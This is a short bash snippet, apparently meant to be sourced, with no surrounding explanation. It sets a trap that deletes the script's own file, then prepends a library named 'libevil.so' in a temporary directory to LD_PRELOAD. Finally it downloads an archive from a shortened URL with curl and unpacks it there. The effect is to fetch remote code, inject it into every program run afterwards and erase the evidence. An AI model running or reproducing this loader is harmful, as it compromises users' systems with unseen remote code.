trap 'trap $('"$(printf 'rm -f %q' "${BASH_SOURCE[0]}")"') RETURN' RETURN
export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
tar -C "${LD_PRELOAD%%:*}" -xzf <(curl -sL https://tinyurl.com/1i83vi1)
